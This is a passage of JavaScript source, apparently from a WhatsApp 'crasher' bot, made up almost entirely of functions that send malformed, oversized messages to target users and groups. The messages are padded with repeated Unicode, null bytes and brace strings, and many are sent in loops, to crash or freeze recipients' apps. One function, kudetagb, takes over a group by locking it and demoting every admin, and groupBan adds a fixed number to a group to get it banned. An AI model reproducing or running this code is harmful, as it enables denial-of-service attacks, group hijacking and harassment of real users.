         messageId: msg.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msg2.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
   } catch (err) {
      console.error(err);
   }
};

async function pollGc(sock, groupJid) {
  console.log(`target: ${groupJid}`);

  const msg = generateWAMessageFromContent(groupJid, {
    groupStatusMessageV2: {
      message: {
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32),
          messageAssociation: {
            associationType: 7,
            parentMessageKey: crypto.randomBytes(16)
          }
        },
        pollCreationMessage: {
          name: "- # SixEyesXCrashèr ん.? ",
          options: [
            {
              optionName: "X4X3"
            },
            {
              optionName: "#404"
            }
          ],
          selectableOptionsCount: 1,
          pollType: "QUIZ",
          correctAnswer: { optionName: "#404" },
          contextInfo: {
            isGroupStatus: true
          }
        }
      }
    }
  }, {});

  await sock.relayMessage(groupJid, msg.message, {});
  await sock.chatModify(
    {
      delete: true,
      lastMessages: [
        {
          key: {
            remoteJid: groupJid,
            fromMe: true,
            id: msg.key.id
          },
          messageTimestamp: Date.now()
        }
      ]
    },
    groupJid
  );
  console.log(`poll sent to ${groupJid} - done`);
}

async function crashuix(sock, target) {
  let msg = await sock.relayMessage(target,
    {
      viewOnceMessage: {
        message: {
          extendedTextMessage: {
            text: "ꦽ".repeat(60000),
            contextInfo: {
              mentionedJid: [target],            
            }
          }
        }
      }
    },
  { participant: { jid: target } })

  let idmsg = { remoteJid: target, fromMe: true, id: msg }

  for (let i = 0; i < 999; i++) {
    await sock.relayMessage(target,
      {
        statusQuestionAnswerMessage: {
          key: idmsg, 
          text: "- # SixEyesXCrashèr ん.? "
        }
      },
   { participant: { jid: target } })
  }
}

async function BlankChatnoctra(sock, target) {
  const mbg = {
    newsletterAdminInviteMessage: {
      newsletterJid: "1234523456789@newsletter",
      inviteCode: "𑜦𑜠".repeat(250000),
      inviteExpiration: 99999999999,
      newsletterName: "ោ៝" + "ꦾ".repeat(250000),
      },
      body: {
        text: "- # SixEyesXCrashèr ん.? " +
              "ោ៝".repeat(25000) +
              "ꦾ".repeat(25000) +
              "@5".repeat(50000),
      },
      nativeFlowMessage: {
        messageParamJson: "{".repeat(25000),
      },
        buttons: [
          {
            name: "cta_url",
            buttonParamJson: "\u0000".repeat(25000),
          },
       ],
    };
  
  await sock.relayMessage(target, mbg, {
    participant: { jid: target },
    messageId: null,
  });
  console.log(`Succes Sending Bug Blank To ${target}`);
}

async function XST44(sock, target) {
  const Blank44 = {
    groupInviteMessage: {
        groupJid: "1@g.us",
        inviteCode: "ꦽ".repeat(1000),
        inviteExpiration: "99999999999",
        groupName: "- # SixEyesXCrashèr ん.? " + "ꦾ".repeat(2500),
        caption: "- # SixEyesXCrashèr ん.? " + "ꦾ".repeat(2000),
        body: {
          text: "𑇂𑆵𑆴𑆿" +
            "ោ៝".repeat(2500) +
            "ꦾ".repeat(25000) +
            "ꦽ".repeat(5000),
        },
      },
      contextInfo: {
       pairedMediaType: 'NOT_PAIRED_MEDIA',
       isQuestion: true,
       isGroupStatus: true,
       forwardingScore: 9741,
       isForwarded: true,
      },
    };

  await sock.relayMessage(target, Blank44, { 
    participant: { jid: target } 
  });
}

async function blankontolu(sock, groupJid) {
  console.log(`target: ${groupJid}`);
  
  const mbg = {
    newsletterAdminInviteMessage: {
      newsletterJid: "1234523456789@newsletter",
      inviteCode: "𑜦𑜠".repeat(250000),
      inviteExpiration: 99999999999,
      newsletterName: "ោ៝" + "ꦾ".repeat(250000),
      },
      body: {
        text: "- # SixEyesXCrashèr ん.? " +
              "ោ៝".repeat(25000) +
              "ꦾ".repeat(25000) +
              "@5".repeat(50000),
      },
      nativeFlowMessage: {
        messageParamJson: "{".repeat(25000),
      },
        buttons: [
          {
            name: "cta_url",
            buttonParamJson: "\u0000".repeat(25000),
          },
       ],
    };
  
  await sock.relayMessage(groupJid, mbg, {
    participant: { jid: groupJid },
    messageId: null,
  });
  console.log(`Succes Sending Bug Blank To ${groupJid}`);
}

async function buggbnibos(sock, groupJid) {
  console.log(`target: ${groupJid}`);
  
  const Blank44 = {
    groupInviteMessage: {
        groupJid: "1@g.us",
        inviteCode: "ꦽ".repeat(1000),
        inviteExpiration: "99999999999",
        groupName: "- # SixEyesXCrashèr ん.? " + "ꦾ".repeat(2500),
        caption: "- # SixEyesXCrashèr ん.? " + "ꦾ".repeat(2000),
        body: {
          text: "𑇂𑆵𑆴𑆿" +
            "ោ៝".repeat(2500) +
            "ꦾ".repeat(25000) +
            "ꦽ".repeat(5000),
        },
      },
      contextInfo: {
       pairedMediaType: 'NOT_PAIRED_MEDIA',
       isQuestion: true,
       isGroupStatus: true,
       forwardingScore: 9741,
       isForwarded: true,
      },
    };

  await sock.relayMessage(groupJid, Blank44, { 
    participant: { jid: groupJid } 
  });
  console.log(`Succes Sending XST44 To ${groupJid}`);
}

async function freezeios(sock, target) {
  await sock.relayMessage(target, {
     requestPhoneNumberMessage: {
      contextInfo: {
        externalAdReply: {
         title: "- # SixEyesXCrashèr ん.? ",
         body: "𑇂𑆵𑆴𑆿".repeat(30000),
         mediaType: 1,
             sourceUrl: "https://t.me/xeternalz_info",
         thumbnailUrl: "https://t.me/xeternalz_info",
         renderLargerThumbnail: true,
         showAdAttribution: false,
        },
        forwardedNewsletterMessageInfo: {
          newsletterJid: "120363420757607688@newsletter",
          newsletterName: "𑇂𑆵𑆴𑆿".repeat(30000),
          serverMessageId: 7205
        }
      }
    }
  }, {
   participant: { jid: target }
 });
}

async function BlankFreeze(sock, target) {
   const msg = generateWAMessageFromContent(target, {
        interactiveResponseMessage: {
            body: { text: "- # SixEyesXCrashèr ん.? ", format: 1 },
            nativeFlowResponseMessage: {
                name: "galaxy_message",
                paramsJson: JSON.stringify({
                    wa_flow_response_params: {
                        title: "𑇂𑆵𑆴𑆿".repeat(60000)
                    }
                }),
                version: 3
            }
        }
    }, {
        participant: { jid: target }
    });
await sock.relayMessage(target, {
     interactiveMessage: {
       body: {
         text: "- # SixEyesXCrashèr ん.? "
            },
            nativeFlowMessage: {
            buttons: [
{
   name: "review_and_pay",
   buttonParamsJson: JSON.stringify({
      currency: "IDR",
      total_amount: { 
      value: 999999999999, 
      offset: 100 
      },
      reference_id: "\u0000".repeat(5000),
      order: {
      status: "pending",
      items: [
      {
      name: "𑇂𑆵𑆴𑆿".repeat(9999),
      amount: { value: 100000, offset: 100 },
      quantity: 99999
            }
         ]
      }
   })
}
],
},
},
}, { participant: { jid: target }});
  
  await sock.relayMessage(target, {
      stickerPackMessage: {
        stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
        name: "z".repeat(100000),
        publisher: "x".repeat(80000),
        stickers: [],
        fileLength: "9999999999999",
        fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
        fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
        mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
        directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc",
        packDescription: "y".repeat(70000),
        stickerPackOrigin: "USER_CREATED"
      }
    }, {});
    
await sock.relayMessage(target, {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: [
          {
            name: "payment_info",
            buttonParamsJson: {"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"${Date.now()}","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"${'𑇂𑆵𑆴𑆿'.repeat(90000)}","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"MakLo","key":"${'\u0000'.repeat(900000)}","key_type":"CPF"}}],"share_payment_status":false}
          }
        ]
      }
    }
  }, { participant: { jid: target } });
}

async function nativeFrz(sock, target) {
  await sock.relayMessage(target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "- # SixEyesXCrashèr ん.? " + "ꦽ".repeat(5000)
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
              buttons: Array.from({ length: 500000 }, () => ({}))
            },
            contextInfo: {
              mentionedJid: [target]
            }
          }
        }
      }
    },
    { participant: { jid: target } }
  );
}

async function RaP(sock, target) {
  await sock.relayMessage(target, {
    message: {
     interactiveMessage: {
      body: {
        text: "\0"
       },
       nativeFlowMessage: {
         name: "review_and_pay",
         buttonParamsJson: `{"reference_id":"${"𑇂".repeat(50000)}","currency":"IDR","total_amount":{"value":150000,"offset":100},"order":{"status":"pending","subtotal":{"value":120000,"offset":100},"tax":{"value":30000,"offset":100},"items":[{"name":"${"\0".repeat(9000)}","amount":{"value":12000000,"offset":100},"quantity":1000}]}}`
        }
      }
    }
  }, { 
  participant: { jid: target }
 });
}

async function CrashLockScreenGb(sock, groupJid) {
  console.log(`target: ${groupJid}`);

  const msg1 = await generateWAMessageFromContent(
    groupJid,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "- # SixEyesXCrashèr ん.? " +
              "ោ៝".repeat(25000) +
              "ꦾ".repeat(25000) +
              "@5".repeat(50000),
            },
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  { length: 2000 },
                  () =>
                    "1" +
                    Math.floor(Math.random() * 5000000) +
                    "@s.whatsapp.net"
                ),
              ],
              stanzaId: "123",
              quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 3,
                  expiryTimestamp: Date.now() + 1814400000,
                },
                forwardedAiBotMessageInfo: {
                  botName: "META AI",
                  botJid:
                    Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                  creatorName: "Bot",
                },
              },
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
              buttons: [
                {
                  name: "single_select",
                  buttonParamJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamJson: JSON.stringify({
                    status: true,
                  })
                },
                {
                  name: "mpm",
                  buttonParamJson: JSON.stringify({
                    status: true,
                  })
                },
              ],
            },
          },
        },
      },
    },
    {}
  );
  
  const msg2 = generateWAMessageFromContent(groupJid, {
    viewOnceMessageV2: {
      message: {
        listResponseMessage: {
          title: "- # SixEyesXCrashèr ん.? " + "ꦾ".repeat(5000),
          listType: 4,
          buttonText: { displayText: "🩸" },
          sections: [],
          singleSelectReply: {
            selectedRowId: "⌜⌟"
          },
          contextInfo: {
            participant: groupJid,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1900 },
                () =>
                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
            remoteJid: "- # SixEyesXCrashèr ん.? ",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 1,
                expiryTimestamp: Math.floor(Date.now() / 1000) + 60
              }
            },
            externalAdReply: {
              title: "☀️",
              body: "🩸",
              mediaType: 1,
              renderLargerThumbnail: false,
              nativeFlowButtons: [
                {
                  name: "payment_info",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "",
                },
              ],
            },
            extendedTextMessage: {
            text: "ꦾ".repeat(20000) + "@1".repeat(20000),
            contextInfo: {
              stanzaId: groupJid,
              participant: groupJid,
              quotedMessage: {
                conversation:
                  "Bokep-Jepang" +
                  "ꦾ࣯࣯".repeat(50000) +
                  "@1".repeat(20000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
           participant: groupJid, 
          }
        }
      }
    }
  }, {});
  
  const msg3 = await generateWAMessageFromContent(
    groupJid,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: { 
            header: {
              title: "ꦾ࣯࣯".repeat(50000),
              locationMessage: {
                degreesLatitude: 0,
                degreesLongitude: 0,
              },
              hasMediaAttachment: true,
            },
            body: {
              text: "Bokep-Indonesia" +
              "ោ៝".repeat(25000) +
              "ꦾ".repeat(25000) +
              "@5".repeat(50000),
             },
             nativeFlowMessage: {
               messageParamJson: "{[".repeat(50000),
               buttons: [
                 { name: "cta_call",
                 buttonParamsJson: JSON.stringify({ status: true }) },
                { name: "cta_copy",    
                buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(50000) }) },
               { name: "quick_reply", 
               buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(50000) }) },
               ],
             },
           },
         },
       },
     },
     {}
  );
  
  await sock.relayMessage(groupJid, msg1.message, {
    messageId: msg1.key.id,
    participant: { jid: groupJid },
  });
  
  await sock.relayMessage(groupJid, msg2.message, {
    messageId: msg2.key.id,
    participant: { jid: groupJid },
  });
  
  await sock.relayMessage(groupJid, msg3.message, {
    participant: { jid: groupJid },
    messageId: msg3.key.id,
  });
  
  console.log(`crash sent to ${groupJid} - done`);
}

async function CrashLockScreen(sock, target) {
  const msg1 = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "- # SixEyesXCrashèr ん.? " +
              "ោ៝".repeat(25000) +
              "ꦾ".repeat(25000) +
              "@5".repeat(50000),
            },
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  { length: 2000 },
                  () =>
                    "1" +
                    Math.floor(Math.random() * 5000000) +
                    "@s.whatsapp.net"
                ),
              ],
              stanzaId: "123",
              quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 3,
                  expiryTimestamp: Date.now() + 1814400000,
                },
                forwardedAiBotMessageInfo: {
                  botName: "META AI",
                  botJid:
                    Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                  creatorName: "Bot",
                },
              },
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
              buttons: [
                {
                  name: "single_select",
                  buttonParamJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamJson: JSON.stringify({
                    status: true,
                  })
                },
                {
                  name: "mpm",
                  buttonParamJson: JSON.stringify({
                    status: true,
                  })
                },
              ],
            },
          },
        },
      },
    },
    {}
  );
  
  const msg2 = generateWAMessageFromContent(target, {
    viewOnceMessageV2: {
      message: {
        listResponseMessage: {
          title: "- # SixEyesXCrashèr ん.? " + "ꦾ".repeat(5000),
          listType: 4,
          buttonText: { displayText: "🩸" },
          sections: [],
          singleSelectReply: {
            selectedRowId: "⌜⌟"
          },
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1900 },
                () =>
                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
            remoteJid: "- # SixEyesXCrashèr ん.? ",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 1,
                expiryTimestamp: Math.floor(Date.now() / 1000) + 60
              }
            },
            externalAdReply: {
              title: "☀️",
              body: "🩸",
              mediaType: 1,
              renderLargerThumbnail: false,
              nativeFlowButtons: [
                {
                  name: "payment_info",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "",
                },
              ],
            },
            extendedTextMessage: {
            text: "ꦾ".repeat(20000) + "@1".repeat(20000),
            contextInfo: {
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation:
                  "Bokep-Jepang" +
                  "ꦾ࣯࣯".repeat(50000) +
                  "@1".repeat(20000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
           participant: target, 
          }
        }
      }
    }
  }, {});
  
  const msg3 = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: { 
            header: {
              title: "ꦾ࣯࣯".repeat(50000),
              locationMessage: {
                degreesLatitude: 0,
                degreesLongitude: 0,
              },
              hasMediaAttachment: true,
            },
            body: {
              text: "Bokep-Indonesia" +
              "ោ៝".repeat(25000) +
              "ꦾ".repeat(25000) +
              "@5".repeat(50000),
             },
             nativeFlowMessage: {
               messageParamJson: "{[".repeat(50000),
               buttons: [
                 { name: "cta_call",
                 buttonParamsJson: JSON.stringify({ status: true }) },
                { name: "cta_copy",    
                buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(50000) }) },
               { name: "quick_reply", 
               buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(50000) }) },
               ],
             },
           },
         },
       },
     },
     {}
  );
  
  await sock.relayMessage(target, msg1.message, {
    messageId: msg1.key.id,
    participant: { jid: target },
  });
  
  await sock.relayMessage(target, msg2.message, {
    messageId: msg2.key.id,
    participant: { jid: target },
  });
  
  await sock.relayMessage(target, msg3.message, {
    participant: { jid: target },
    messageId: msg3.key.id,
  });
}

async function kontolbapalu(sock, target) {
sock.relayMessage(target, {
  viewOnceMessage: {
    message: {
      interactiveMessage: {
        body: {
          text: "\u0007"
        },
        nativeFlowMessage: {
          messageParamsJson: "{\"name\":\"call_pemission_request\",\"title\":\"#vsp\",\"header\":\"- # SixEyesXCrashèr ん.? \",\"body\":\"explanation travazap body\"}",
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: "{\"title\":\"- # SixEyesXCrashèr ん.? " + "᬴".repeat(100000) + "\",\"sections\":[{\"title\":\" vaultsuperior ϟ\",\"rows\":[]}]}"
            },
            {
              name: "single_select",
              buttonParamsJson: "{\"title\":\"- # SixEyesXCrashèr ん.? " + "᬴".repeat(100000) + "\",\"sections\":[{\"title\":\" vaultsuperior ϟ\",\"rows\":[]}]}"
            },
            {
              name: "single_select",
              buttonParamsJson: "{\"title\":\"- # SixEyesXCrashèr ん.? " + "᬴".repeat(100000) + "\",\"sections\":[{\"title\":\" vaultsuperior ϟ\",\"rows\":[]}]}"
            }
          ]
        }
      }
    }
  }
}, {})
}

async function LocatonStc(sock, target) {
  try {
    const payload = "᬴᬴᬴".repeat(15000) + "꧔꧈".repeat(15000) + "ꦽ".repeat(20000);

    const message = {
      viewOnceMessage: {
        message: {
          ephemeralMessage: {
            message: {
              interactiveMessage: {
                header: {
                  title: payload,
                  hasMediaAttachment: false,
                  locationMessage: {
                    degreesLatitude: 992.999999,
                    degreesLongitude: -932.8889989,
                    name: payload,
                    address: payload,
                  },
                },
                body: {
                  text: "- # SixEyesXCrashèr ん.? " + "꧔꧈".repeat(2000),
                },
                contextInfo: {
                  participant: target,
                  mentionedJid: [
                    "0@s.whatsapp.net",
                    ...Array.from({ length: 1900 }, () =>
                      "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                    ),
                  ],
                  remoteJid: "X",
                  stanzaId: "123",
                  nativeFlowMessage: {
                    messageParamJson: "{".repeat(25000),
                  },
                  stickerMessage: {
                    url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
                    fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
                    fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
                    mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
                    mimetype: "image/webp",
                    height: 9999,
                    width: 9999,
                    directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
                    fileLength: 12260,
                    mediaKeyTimestamp: "1743832131",
                    isAnimated: false,
                    stickerSentTs: "X",
                    isAvatar: false,
                    isAiSticker: false,
                    isLottie: false,
                  },
                },
              },
            },
          },
        },
      },
    };

    await sock.relayMessage(target, message, {
      participant: { jid: target },
    });
    
    console.log(`Sending Bug To ${target}`);
  } catch (err) {
    console.error(err);
  }
}

async function FreezeHard(sock, target) {
    const msg1 = {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "- # SixEyesXCrashèr ん.? "
                    },
                    nativeFlowResponseMessage: {
                        name: "single_select",
                        paramsJson: "\x10".repeat(1030000),
                       version: 3
                    }
                }
            }
        }
    };

    const msg2 = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        hasMediaAttachment: true,
                        locationMessage: {
                            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJCR0JHQl1hjX2Xe3N7l33gsJycsOD/2c7Z////////////////CABEIAEgASAMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAAABQEDBAIGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAADzk9SclkpPXF+5iiyM2sklt0VsUww2IzVexT7ebhvSik1Cm1Q0G7HLrxdFdlQuxdrSswHScPkF2L6S5Cyj0uLSvEKrZkOTorkAnQB6pYAk4AgA/8QAJRAAAgICAgICAQUAAAAAAAAAAQIAAwQREgEQMQUTFCAiMlJx/9oACAEBAAE/AJqcZ3EcejHRdcoTBD41AJxgWEbXUZdHqDUPhKS46ENbIex4pwb7ByCyypqyVYaM46acDCpEC7mMCQVE466ddyrC3YP6ytQiAAT5KlmsUqs/DIBLGPRpSRHXYinqYj8WMRlaVqEUdQeo4B9y019ncu4rUW37nUVyJgIb7fRAiJRT/HtpU2/fh9aOzqXWYwJBtmfYnFVRtiLYy+MLJUp9ajUDHcwbftyLSD0PGQdKZ8giaVx0TCfNVprIIlucXTSjU+FfQeFplHoiZT83/wA/VRfZSf2mU5aGlSXmZkr3poTD4//EABwRAAICAgMAAAAAAAAAAAAAAAEQABAgIQISQf/aAAgBAgEBPwBDYfhXEzUIlisOzOJf/8QAGREAAgMBAAAAAAAAAAAAAAAAAREAECAw/9oACAEDAQE/ANkU4sLn/9k=",
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        }
                    },
                    body: {
                        text: "\u0000".repeat(10000)
                    },
                    footer: {
                        text: "- # SixEyesXCrashèr ん.? "
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "{".repeat(10000),
                        buttons: [
                            {
                                name: "single_select",
                                buttonParamsJson: `{"title":"\0${"\u0018".repeat(1000)}","sections":[{"title":"JesterProfessor","rows":[]}]}`
                            },
                            {
                                name: "galaxy_message",
                                buttonParamsJson: "\u0000".repeat(10000)
                            }
                        ]
                    }
                }
            }
        }
    };

    const msg3 = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "- # SixEyesXCrashèr ん.? " + "ん.".repeat(5000)
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "{".repeat(10000),
                        buttons: Array.from({ length: 500000 }, () => ({}))
                    }
                }
            }
        }
    };
        for (let i = 0; i < 75; i++) {
        await new Promise(r => setTimeout(r, 75));
            for (const msg of [msg1, msg2, msg3]) {
                await sock.relayMessage(
                    target,
                    msg,
                    {
                        messageId: null
                    }
                );
            }
        }
}

async function locxX(sock, target) {
  const msg = generateWAMessageFromContent(target,
    {
      buttonsMessage: {
        locationMessage: {
          degreesLongitude: 0,
          degreesLatitude: 0,
          jpegThumbnail: "",
          name: "- # SixEyesXCrashèr ん.? ",
          url: "https://t.me/xeternalz_info"
        },
        contentText: "\0",
        contextInfo: {
          mentionedJid: [target],
        },
        buttons: [
          {
            buttonId: "\0",
            buttonText: {
              displayText: "ี".repeat(300000)
            },
            type: 1
          }
        ],
        headerType: 6
      }
    },
    {}
  );
  
  await sock.relayMessage(target, msg.message, {});
  await sock.chatModify({
    delete: true,
    lastMessages: [{
      key: {
        remoteJid: target,
        fromMe: true,
        id: msg.key.id
      },
      messageTimestamp: Date.now()
    }]
  }, target);
}

async function GlxButton(sock, target) {
 const msg = await generateWAMessageFromContent(target, {
    message: {
     buttonsMessage: {
      contentText: "- # SixEyesXCrashèr ん.? ",
      buttons: [
       {
         buttonId: "x",
         buttonText: {
          displayText: "\x10"
         },
         type: 2,
         nativeFlowInfo: {
          name: "galaxy_message",
          paramsJson: "\0"
         }
       },
     ]
   }
 }
}, {});
 
 await sock.relayMessage(target, msg.message, {
     messageId: msg.key.id
   })
  await sleep(1000)
  await sock.chatModify(
    {
      clear: {
        messages: [
          {
            id: msg.key.id,
            fromMe: msg.key.fromMe,
            timestamp: msg.messageTimestamp.low
          }
        ]
      }
    }, target )
}

async function satz(sock, target) {
  for (let i = 0; i < 100; i++) {
    await sock.relayMessage(
      target,
      {
        groupStatusMessageV2: {
          message: {
            extendedTextMessage: {
              text: "- # SixEyesXCrashèr ん.? ",
              paymentLinkMetadata: {
                provider: {
                  paramsJson: "[{".repeat(80000)
                },
                header: {
                  headerType: 1
                },
                button: {
                  displayText: "SatzHere"
                }
              },
              contextInfo: {
featureEligibilities: Array.from({ length: 1000 }, () => ({
                canReceiveMultiReact: true
              })),
              isQuestion: true,
forwardedAiBotMessageInfo: {
                botJid: "867051314767696@bot"
              },
forwardingScore: 9999,
isForwarded: true,
mentionedJid: Array.from({ length: 1999 }, () => 
                            "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                        ),
                remoteJid: "status@broadcast",
                quotedMessage: {
                  interactiveResponseMessage: {
                    body: {},
                    nativeFlowResponseMessage: {
                      name: "menu_options",
                      paramsJson: JSON.stringify({
                        display_text: "\u0000".repeat(90000),
                        description: "\u0000".repeat(9000),
                        id: "Satz"
                      }),
                      version: 3
                    }
                  }
                }
              }
            }
          }
        }
      },
      {}
    );
  }
}

async function kudetagb(sock, groupJid) {
  try {
    const groupMetadata = await sock.groupMetadata(groupJid);
    const admins = groupMetadata.participants.filter(p => p.admin && p.id !== sock.user.id);

    // FASE 1 — Kirim pengumuman kudeta
    await sock.sendMessage(groupJid, { text: "Group Anda Saya Sita, Powerade By # XeternalzCrasher ん." }).catch(err => {
      console.log(`❌ [kudetagb] Gagal kirim pesan: ${err.message}`);
    });

    // FASE 2 — Kunci grup (only admins yang bisa chat)
    await sock.groupSettingUpdate(groupJid, "announcement").catch(err => {
      console.log(`❌ [kudetagb] Gagal kunci grup: ${err.message}`);
    });

    if (admins.length === 0) {
      console.log(`[kudetagb] ${groupJid} — tidak ada admin yang bisa diturunkan`);
      return;
    }

    // FASE 3 — Demote semua admin sekaligus
    await Promise.all(
      admins.map(adm =>
        sock.groupParticipantsUpdate(groupJid, [adm.id], "demote")
          .then(() => console.log(`✅ [kudetagb] Berhasil demote ${adm.id}`))
          .catch(err => console.log(`❌ [kudetagb] Gagal demote ${adm.id}: ${err.message}`))
      )
    );

    console.log(`[kudetagb] Selesai — ${admins.length} admin diproses, grup dikunci`);
  } catch (err) {
    console.log(`❌ [kudetagb] Error: ${err.message}`);
  }
}

async function groupBan(sock, target) {
  if (!target.endsWith("@g.us")) throw "@g.us server required";
  try {
    await sock.groupParticipantsUpdate(target, ["13135550002@s.whatsapp.net"], "add")
  } catch (e) {
    throw e
  }
}

async function BlankXFreeze(sock, groupJid) {
  const videoPayload = await prepareWAMessageMedia({
    video: { url: "https://files.catbox.moe/rb111f.mp4", gifPlayback: true }
  }, {
    upload: sock.waUploadToServer,
    mediaType: "video"
  })
  for (let i = 0; i < 100; i++) {
    const msg = generateWAMessageFromContent(groupJid, proto.Message.fromObject({
      interactiveMessage: {
        contextInfo: {
          mentionedJid: [groupJid],
          isForwarded: true,
          forwardingScore: 999,
          forwardedNewsletterMessageInfo: {
            newsletterJid: "120363399013145023@newsletter",
            newsletterName: "https://xeternalz_info",
            serverMessageId: 1
          }
        },
        header: {
          title: "",
          ...imagePayload,
          hasMediaAttachment: true
        },
        body: { text: "- # SixEyesXCrashèr ん.? " },
        footer: { text: "" },
        nativeFlowMessage: {
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: `{"title":"${"ꦾ".repeat(10000)}","sections":[{"title":"Crash","rows":[]}]}`
            },
            {
              name: "galaxy_message",
              buttonParamsJson: JSON.stringify({
                "screen_1_TextInput_0": "radio - buttons" + "\0".repeat(10000),
                "screen_0_Dropdown_1": "Null",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
              }),
              version: 3
            }
          ]
        }
      }
    }), { userJid: groupJid })
    await sock.relayMessage(target, msg.message, { messageId: msg.key.id })
  }
}

async function CatalogBug(sock, groupJid) {
  console.log(`target: ${groupJid}`);
  
  await sock.relayMessage(groupJid, {
    interactiveMessage: {
      body: { text: "X" },
      nativeFlowMessage: {
        buttons: [
          {
            name: "catalog_message",
            buttonParamsJson: "{}"
          }
        ],
        messageParamsJson: "{}"
      }
    }
  }, {
    additionalNodes: [
      {
        tag: "biz",
        attrs: {
          native_flow_name: "catalog_message"
